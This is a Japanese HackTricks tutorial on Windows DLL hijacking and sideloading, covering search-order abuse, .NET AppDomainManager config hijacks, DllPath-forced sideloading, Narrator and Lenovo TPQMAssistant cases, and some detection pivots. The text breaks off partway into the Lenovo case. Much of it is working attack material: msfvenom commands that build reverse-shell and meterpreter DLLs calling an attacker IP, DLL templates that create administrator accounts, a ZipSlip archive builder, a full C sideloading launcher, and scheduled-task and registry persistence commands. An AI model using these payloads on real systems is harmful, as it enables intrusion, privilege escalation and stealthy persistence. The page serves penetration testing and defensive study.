# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## 基本情報

DLL Hijacking は、信頼されたアプリケーションを操作して悪意のある DLL をロードさせる手法です。この用語には、**DLL Spoofing、Injection、Side-Loading** などの複数の戦術が含まれます。主にコード実行や永続化の確立に利用され、権限昇格に使われることは比較的少ないです。ここでは権限昇格に焦点を当てていますが、Hijacking の手法自体は目的にかかわらず同じです。

### 代表的な手法

DLL Hijacking には複数の手法があり、それぞれの有効性はアプリケーションの DLL ロード戦略によって異なります:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: 正規の DLL を悪意のある DLL に置き換える手法です。DLL Proxying を使用して、元の DLL の機能を維持することもできます。
2. **DLL Search Order Hijacking**: 正規の DLL よりも先に検索されるパスに悪意のある DLL を配置し、アプリケーションの検索パターンを悪用する手法です。
3. **Phantom DLL Hijacking**: 存在しない必須 DLL だとアプリケーションに思わせ、ロードさせるための悪意のある DLL を作成する手法です。
4. **DLL Redirection**: `%PATH%` や `.exe.manifest` / `.exe.local` ファイルなどの検索パラメータを変更し、アプリケーションを悪意のある DLL に誘導する手法です。
5. **WinSxS DLL Replacement**: WinSxS ディレクトリ内の正規 DLL を悪意のある DLL に置き換える手法です。これは DLL side-loading に関連することが多い手法です。
6. **Relative Path DLL Hijacking**: コピーしたアプリケーションとともに、ユーザーが制御可能なディレクトリへ悪意のある DLL を配置する手法です。Binary Proxy Execution techniques に類似しています。


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Classic DLL sideloading は、信頼された **.NET Framework** プロセスに attacker code をロードさせる唯一の方法ではありません。対象の実行ファイルが **managed** application の場合、CLR は実行ファイル名に基づく **application configuration file**（例: `Setup.exe.config`）も参照します。このファイルでは、カスタム **AppDomainManager** を定義できます。config が EXE の隣に配置された attacker-controlled assembly を指定している場合、CLR は **application's normal code path** よりも前にそれをロードし、信頼されたプロセス内で実行します。<sup>[[24]](#references)</sup>

Microsoft の .NET Framework configuration schema によると、カスタム manager を使用するには `<appDomainManagerAssembly>` と `<appDomainManagerType>` の両方が存在している必要があります。<sup>[[16]](#references)[[17]](#references)</sup>

最小構成:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
最小限のマネージャー:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
実践的な注意事項:
- これは **.NET Framework specific** な tradecraft です。Win32 DLL search order ではなく、CLR config parsing に依存します。
- ホストは本当に **managed EXE** でなければなりません。簡易 triage: `sigcheck -m target.exe`、`corflags target.exe`、または PE metadata の **CLR Runtime Header** を確認します。
- config filename は executable name と完全に一致する必要があります（`<binary>.config`）。通常は **EXE の隣** に配置されます。
- これは **signed Microsoft/vendor binaries** と組み合わせると有用です。trusted EXE を変更せずに、悪意のある managed assembly を in-process で実行できます。
- すでに writable installer/update directory がある場合、AppDomainManager hijacking を **first stage** として使用し、その後の stage では classic DLL sideloading または reflective loading を使用できます。

### AppDomainManager を downloader + scheduled-task bootstrap として使用

実践的な侵入パターンとして、trusted managed EXE に悪意のある `*.config` と、**small bootstrapper** としてのみ動作する悪意のある AppDomainManager DLL の両方を組み合わせます:<sup>[[25]](#references)</sup>

1. ユーザーが、`%USERPROFILE%\Downloads` のような信頼できそうな場所から signed .NET installer または updater を起動します。
2. 隣接する config により、正規の app logic が開始する **前** に CLR が attacker assembly を load します。
3. 悪意のある manager が **path gate** を実行します（たとえば、host EXE が `Downloads` から実行されている場合のみ続行し、second stage は `%LOCALAPPDATA%` からのみ実行を許可します）。
4. check に pass すると、`%LOCALAPPDATA%\PerfWatson2.exe` のような user-writable path に real payload を download し、scheduled task で persistence を install します。

この variant が重要な理由:
- signed host EXE は変更されないため、main binary の hash だけを確認する triage では compromise を見逃す可能性があります。
- 単純な **path-based anti-analysis** は一般的です。ZIP/EXE/DLL の triad を Desktop、Temp、または sandbox path に移動すると、意図的に chain を破壊できます。
- first-stage AppDomainManager DLL は小さく low-noise に保ち、後から real implant を fetch できます。

このパターンで頻繁に見られる最小限の persistence 例:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Notes:
- ` /rl highest` は、そのユーザー/セッションで**利用可能な最高権限**を意味します。これだけでSYSTEMへの昇格が保証されるわけではありません。
- この technique は、classic な missing-DLL search-order hijacking というより、**.NET config abuse による execution/persistence**として分類する方が適切な場合が多くあります。ただし、operators は両方を頻繁に組み合わせます。

Detection pivots:
- **ZIP extraction paths**、`Downloads`、`%TEMP%`、その他のユーザーが書き込み可能なフォルダから起動され、**colocated** な `<exe>.config` を持つ、署名済みの .NET executables。
- アクションが `%LOCALAPPDATA%`、`%APPDATA%`、または `Downloads` 内を指し、名前が browser/vendor updaters を模倣している新しい scheduled tasks。
- 別の EXE を直ちに download してから `schtasks.exe` を spawn する、短時間だけ実行される managed bootstrap processes。
- executable path が想定された user-profile directory と一致しない場合に早期終了する samples。

### 既存の scheduled task を hijack して sideload chain を再起動する

persistence のために、**新しい task の作成**だけを探してはいけません。一部の intrusion sets は、正規の installer が**通常の updater task**を作成するまで待機し、その後 **task action を書き換え**ます。これにより、既存の名前、author、trigger が defenders にとって見慣れたままになります。

Reusable workflow:
1. 正規の software を install/run し、通常作成される task を特定します。
2. task XML を export し、現在の `<Exec><Command>` / `<Arguments>` の値を確認します。<sup>[[23]](#references)</sup>
3. action のみを置き換え、user-writable staging directory にある **trusted host EXE** を task が起動するようにします。その EXE が実際の payload を side-load または AppDomain-load します。
4. 新しく明らかな persistence artifact を作成する代わりに、同じ task name で再登録します。
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
なぜより stealthy なのか:
- task name は引き続き正当なものに見せられます（例: vendor updater）。
- **Task Scheduler service** が起動するため、parent/ancestor validation では、`explorer.exe` ではなく、想定される scheduling chain が確認されることがよくあります。
- **new task names** だけを探す DFIR team は、registration 自体は既存でも、action が `%LOCALAPPDATA%`、`%APPDATA%`、または attacker-controlled path を指すように変更された task を見逃す可能性があります。

Fast hunting pivots:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- `C:\Windows\System32\Tasks\*` XML と `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` metadata を baseline と比較します。
- **vendor-looking updater task** が **user-writable directories** から実行される場合、または隣接する `*.config` file を持つ .NET EXE を起動する場合に alert を出します。

> [!TIP]
> HTML staging、AES-CTR configs、.NET implants を DLL sideloading に重ねる step-by-step chain については、以下の workflow を確認してください。

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## missing Dlls の発見

system 内で missing Dlls を見つける最も一般的な方法は、sysinternals の [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) を起動し、**以下の 2 つの filters を設定する**ことです:

![Common Techniques - Finding missing Dlls: system 内で missing Dlls を見つける最も一般的な方法は、sysinternals の procmon を起動し、以下の 2 つの filters を設定することです](<../../../images/image (961).png>)

![Common Techniques - Finding missing Dlls: system 内で missing Dlls を見つける最も一般的な方法は、sysinternals の procmon を起動し、以下の 2 つの filters を設定することです](<../../../images/image (230).png>)

そして **File System Activity** のみを表示します:

![Common Techniques - Finding missing Dlls: そして File System Activity のみを表示します](<../../../images/image (153).png>)

**missing dlls in general** を探している場合は、これを数 **seconds** 実行したままにします。\
**specific executable 内の missing dll** を探している場合は、`"Process Name" "contains" <exec name>` のような **別の filter** を設定して実行し、**events の capture を停止**します。<sup>[[9]](#references)</sup>

## Missing Dlls の Exploiting

privileges を escalate するには、privileged process が load しようとする **dll を、検索対象となる場所のいずれかに write できる**ことが最も有効です。したがって、**original dll** が存在する folder よりも **先に dll が検索される folder**（特殊なケース）に dll を **write** できるか、または **dll が検索される folder** に **write** でき、どの folder にも original **dll が存在しない**状態を利用できます。

### Dll Search Order

**[Microsoft documentation](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching)** では、Dlls が具体的にどのように load されるかを確認できます。

**Windows applications** は、**pre-defined search paths** の set に従い、特定の sequence で DLLs を探します。DLL hijacking は、これらの directories のいずれかに harmful DLL を戦略的に配置し、authentic DLL より先に load されるようにすることで発生します。これを防ぐには、application が必要な DLLs を参照する際に absolute paths を使用するようにします。

以下に **32-bit** systems における **DLL search order** を示します:

1. application が load された directory。
2. system directory。[**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function を使用して、この directory の path を取得します。(_C:\Windows\System32_)
3. 16-bit system directory。この directory の path を取得する function はありませんが、検索されます。(_C:\Windows\System_)
4. Windows directory。[**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function を使用して、この directory の path を取得します。
1. (_C:\Windows_)
5. current directory。
6. PATH environment variable に列挙された directories。これには **App Paths** registry key で指定された per-application path が含まれない点に注意してください。DLL search path の計算時に **App Paths** key は使用されません。

これは **SafeDllSearchMode** が enabled の場合の **default** search order です。disabled の場合、current directory は 2 番目に移動します。この feature を disable するには、**HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** registry value を作成し、0 に設定します（default は enabled）。

[**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function が **LOAD_WITH_ALTERED_SEARCH_PATH** とともに call された場合、search は **LoadLibraryEx** が load している executable module の directory から開始されます。

最後に、**dll は name だけでなく absolute path を指定して load できる**ことに注意してください。その場合、その dll は **その path のみで検索されます**（dll に dependencies がある場合、それらは name だけで load された場合と同様に検索されます）。

search order を変更する方法は他にもありますが、ここでは説明しません。

### arbitrary file write を missing-DLL hijack に Chaining する

1. **ProcMon** filters（`Process Name` = target EXE、`Path` ends with `.dll`、`Result` = `NAME NOT FOUND`）を使用して、process が probe するものの見つけられない DLL names を収集します。<sup>[[14]](#references)</sup>
2. binary が **schedule/service** 上で実行される場合、それらの names のいずれかを持つ DLL を **application directory**（search-order entry #1）に drop すると、次回の execution で load されます。ある .NET scanner のケースでは、process は `C:\Program Files\dotnet\fxr\...` にある実際の copy を load する前に、`C:\samples\app\` 内で `hostfxr.dll` を探していました。
3. payload DLL（例: reverse shell）を任意の export とともに build します: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`
4. primitive が **ZipSlip-style arbitrary write** の場合、extraction dir から entry が脱出し、DLL が app folder に配置されるような ZIP を craft します:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. archive を監視対象の inbox/share に配置します。scheduled task がプロセスを再起動すると、悪意のある DLL がロードされ、サービスアカウントとしてコードが実行されます。

### RTL_USER_PROCESS_PARAMETERS.DllPath を介した sideloading の強制

新しく作成するプロセスの DLL search path に確実に影響を与える高度な方法は、ntdll の native APIs を使用してプロセスを作成する際に、RTL_USER_PROCESS_PARAMETERS の DllPath フィールドを設定することです。ここで攻撃者が制御するディレクトリを指定すると、import された DLL を名前で解決する対象プロセス（絶対パスを使用せず、安全な loading flags も使用しないプロセス）に対して、そのディレクトリから悪意のある DLL を強制的にロードさせることができます。

Key idea
- RtlCreateProcessParametersEx で process parameters を構築し、制御下のフォルダー（例: dropper/unpacker が存在するディレクトリ）を指す custom DllPath を指定します。
- RtlCreateUserProcess でプロセスを作成します。対象バイナリが DLL を名前で解決すると、loader は解決時に指定された DllPath を参照するため、悪意のある DLL が対象 EXE と同じ場所に存在しない場合でも、信頼性の高い sideloading が可能になります。

Notes/limitations
- これは作成される child process に影響します。current process のみに影響する SetDllDirectory とは異なります。
- 対象は DLL を名前で import または LoadLibrary する必要があります（絶対パスを使用せず、LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories も使用しないこと）。
- KnownDLLs とハードコードされた絶対パスは hijack できません。Forwarded exports と SxS によって優先順位が変わる場合があります。

Minimal C example（ntdll、wide strings、簡略化した error handling）:

<details>
<summary>Full C example: RTL_USER_PROCESS_PARAMETERS.DllPath を介した DLL sideloading の強制</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Operational usage example
- 悪意のある xmllite.dll（必要な functions を export するか、実際のものへ proxy する）を DllPath directory に配置します。
- 上記の technique を使用して、名前によって xmllite.dll を lookup することが知られている signed binary を起動します。loader は指定された DllPath 経由で import を解決し、DLL を sideload します。

この technique は、複数段階の sideloading chain を実行するために in-the-wild で使用されていることが確認されています。最初の launcher が helper DLL を drop し、その DLL が custom DllPath を指定して Microsoft-signed の hijackable binary を spawn し、staging directory から attacker の DLL を強制的に load させます。<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking via `.exe.config`

**.NET Framework** targets では、アプリケーションに隣接する **`.exe.config`** file を悪用することで、memory を patch せずに **`Main()`** より前に sideloading を実行できます。Win32 DLL search order だけに依存する代わりに、attacker は legitimate .NET EXE を、malicious config と 1 つ以上の attacker-controlled assemblies の隣に配置します。

chain の動作:<sup>[[15]](#references)[[22]](#references)</sup>
1. host EXE が開始し、**CLR が `<exe>.config`** を読み取ります。
2. config が **`<appDomainManagerAssembly>`** と **`<appDomainManagerType>`** を設定し、runtime が attacker-controlled `AppDomainManager` を instantiate するようにします。
3. malicious manager が trusted host process 内で **pre-`Main()` execution** を取得します。
4. 同じ config によって、CLR が local assemblies（例: `InitInstall.dll`、`Updater.dll`、`uevmonitor.dll`）を最初に resolve するよう強制でき、inline patching なしで runtime validation / telemetry を弱めることもできます。

Campaign-style pattern（正確な nesting は directive / CLR version によって異なる場合があります）:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
なぜこれが有用なのか:
- **`<probing privatePath="."/>`** はアセンブリ解決をアプリケーションディレクトリ内に限定し、そのフォルダを予測可能な sideloading の対象にします。<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** は CLR の初期化中に実行を攻撃者のコードへ移し、正規のアプリケーションロジックが実行される前に処理します。<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** により、full-trust アプリが strong-name 検証エラーなしで、署名されていない、または改ざんされたアセンブリを読み込める場合があります。<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** は、より新しいアセンブリへの publisher-policy リダイレクトを回避します。<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** は runtime の選択をより決定論的にします。<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** は特に興味深いものです。implant がメモリ内の `EtwEventWrite` にパッチを適用するのではなく、**CLR 自体が設定から独自の ETW への可視性を無効化する**ためです。

近年の campaign で確認されている運用パターン:
- Stage 1 で `setup.exe`、`setup.exe.config`、およびローカルアセンブリを配置します。
- Stage 2 でそれらを信頼できそうな **AppData update** フォルダへコピーし、host の名前を `update.exe` のようなものに変更して、**scheduled task** 経由で再起動します。
- Stage 3 で、最終的な RAT DLL/export を読み込む前に、実行コンテキスト（Task Scheduler から想定される親プロセス `svchost.exe` など）を確認します。

Hunting のアイデア:
- ユーザーが書き込み可能な場所で、不審な隣接 **`.config`** ファイルとともに実行されている、署名済みまたはその他の正規の **.NET executable**。
- **`appDomainManagerAssembly`**、**`appDomainManagerType`**、**`probing privatePath="."`**、**`bypassTrustedAppStrongNames`**、または **`etwEnable enabled="false"`** を含む `.config` ファイル。
- **`%LOCALAPPDATA%`** またはアプリケーション固有の `\bin\update\` ディレクトリから、名前を変更した update binary を再起動する scheduled task。
- scheduled task が信頼された .NET host を起動し、その直後に自身のディレクトリから vendor 以外のアセンブリを読み込む、親子プロセスチェーン。

#### Windows docs における DLL search order の例外

Windows documentation では、標準 DLL search order に対する特定の例外が説明されています。

- **メモリにすでにロードされている DLL と同じ名前の DLL** が検出された場合、システムは通常の search をバイパスします。代わりに、redirection と manifest を確認してから、メモリ内にある DLL をデフォルトとして使用します。**このシナリオでは、システムは DLL の search を実行しません**。
- DLL が現在の Windows version における **known DLL** として認識されている場合、システムはその known DLL の version と、それが依存する DLL を **search process を行わずに**使用します。レジストリキー **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** には、これらの known DLL のリストが保存されています。
- **DLL に dependencies がある**場合、これらの依存 DLL の search は、最初の DLL が full path によって特定されたかどうかに関係なく、依存 DLL が **module name のみで指定された**ものとして実行されます。

### Privileges の昇格

**Requirements**:

- **異なる privileges**（horizontal または lateral movement）で動作する、または動作する予定で、**DLL が不足している** process を特定する。
- **DLL** が **search される**任意の **directory** に対して、**write access** が利用可能であることを確認する。この場所は executable の directory、または system path 内の directory である可能性があります。

そう、要件を見つけるのは複雑です。**デフォルトでは DLL が不足している privileged executable を見つけるのは少し奇妙**であり、さらに **system path folder に write permissions があるのはもっと奇妙**です（デフォルトでは不可能です）。しかし、設定ミスのある環境では可能です。\
運よく要件を満たしていることが分かった場合は、[UACME](https://github.com/hfiref0x/UACME) project を確認できます。この **project の主な goal は UAC の bypass** ですが、そこには使用できる Windows version 向けの Dll hijaking の **PoC** があるかもしれません（おそらく write permissions がある folder の path を変更するだけです）。

次のように実行して、**folder 内の permissions を確認できる**ことに注意してください:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
そして、**PATH 内にあるすべてのフォルダの権限も確認**してください:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
次の方法で、実行ファイルの imports と dll の exports も確認できます：
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
**System Path folder**への書き込み権限を利用して**Dll Hijackingで権限昇格する方法**の完全なガイドについては、以下を確認してください。


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 自動化ツール

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)は、system PATH内の任意のフォルダーに書き込み権限があるかを確認します。\
この脆弱性を発見するために使用できる、その他の興味深い自動化ツールは、**PowerSploit functions**である _Find-ProcessDLLHijack_、_Find-PathDLLHijack_、_Write-HijackDll_ です。

### 例

悪用可能なシナリオを発見した場合、それを正常に悪用するために最も重要なことの1つは、**実行ファイルがインポートするすべてのfunctionsを少なくともexportするdllを作成すること**です。いずれにせよ、Dll Hijackingは、Medium Integrity levelからHigh **（UACを bypass）**へ、または[ **High IntegrityからSYSTEMへ**](../index.html#from-high-integrity-to-system)権限昇格する際に役立つことに注意してください。実行用のdll hijackingに焦点を当てたこのdll hijackingの研究記事、[**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)内に、**有効なdllを作成する方法**の例があります。\
さらに、**次のセクショ**ンでは、**template**として使用したり、必要ではないfunctionsをexportする**dllを作成**したりする際に役立つ可能性がある、いくつかの**basic dll codes**を紹介します。

## **Dllの作成とcompile**

### **Dll Proxifying**

基本的に、**Dll proxy**とは、**loadされたときにmalicious codeをexecute**できるだけでなく、**real libraryへのすべてのcallをrelayすることで**、そのlibraryが**exected**する通りに**expose**および**work**できるDllです。

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant)または[**Spartacus**](https://github.com/Accenture/Spartacus)を使用すると、実際に**実行ファイルを指定してproxifyしたいlibraryを選択し、proxified dllをgenerate**したり、**Dllを指定してproxified dllをgenerate**したりできます。

### **Meterpreter**

**rev shellを取得（x64）：**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**meterpreter（x86）を取得:**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**ユーザーを作成（x86版、x64版は見つけられませんでした）：**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### 自分で作成

いくつかのケースでは、コンパイルする Dll が被害プロセスによってロードされる複数の関数を **export** する必要があることに注意してください。これらの関数が存在しない場合、**binary はそれらをロードできず**、**exploit は失敗します**。

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>ユーザー作成を含む C++ DLL の例</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>thread entry を使用する代替 C DLL</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe は起動時に、予測可能な言語固有の localization DLL を引き続き probe するため、任意の code execution と persistence のために hijack できます。<sup>[[7]](#references)</sup>

主要な事実
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US)。
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`。
- OneCore path に writable な attacker-controlled DLL が存在する場合、それが load され、`DllMain(DLL_PROCESS_ATTACH)` が実行されます。exports は不要です。

Procmon による Discovery
- Filter: `Process Name is Narrator.exe` および `Operation is Load Image` または `CreateFile`。
- Narrator を起動し、上記 path の load 試行を確認します。

Minimal DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC の静粛性
- 素朴な hijack は UI 上で発話やハイライトを行います。静かに動作させるには、attach 時に Narrator のスレッドを列挙し、メインスレッドを (`OpenThread(THREAD_SUSPEND_RESUME)`) で開いて `SuspendThread` します。その後、自分のスレッドで処理を続行します。完全なコードについては PoC を参照してください。<sup>[[8]](#references)</sup>

Accessibility configuration による Trigger と persistence
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 上記の設定により、Narrator の起動時に仕込んだ DLL がロードされます。secure desktop（logon screen）で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が secure desktop 上で SYSTEM として実行されます。

RDP-triggered SYSTEM execution（lateral movement）
- classic RDP security layer を許可します: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- host に RDP 接続し、logon screen で CTRL+WIN+ENTER を押して Narrator を起動すると、DLL が secure desktop 上で SYSTEM として実行されます。
- RDP session が閉じると実行は停止します。速やかに inject/migrate してください。

Bring Your Own Accessibility (BYOA)
- 組み込みの Accessibility Tool (AT) の registry entry（例: CursorIndicator）を clone し、任意の binary/DLL を指すように編集して import した後、`configuration` をその AT name に設定できます。これにより、Accessibility framework の下で任意の実行を proxy できます。

Notes
- `%windir%\System32` 配下への書き込みと HKLM の値の変更には admin rights が必要です。
- すべての payload logic は `DLL_PROCESS_ATTACH` に配置できます。exports は必要ありません。

## Case Study: CVE-2025-1729 - TPQMAssistant.exe を使用した Privilege Escalation

この case では、Lenovo の TrackPoint Quick Menu (`TPQMAssistant.exe`) における **Phantom DLL Hijacking** を説明します。これは **CVE-2025-1729** として追跡されています。<sup>[[2]](#references)[[3]](#references)</sup>

### Vulnerability Details

- **Component**: `C:\ProgramData\Lenovo\TPQM\Assistant\` にある `TPQMAssistant.exe`。
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` は毎日午前 9:30 に、ログオン中の user context で実行されます。
- **Directory Permissions**: `CREATOR OWNER` による書き込みが可能で、local users が arbitrary files を配置できます。
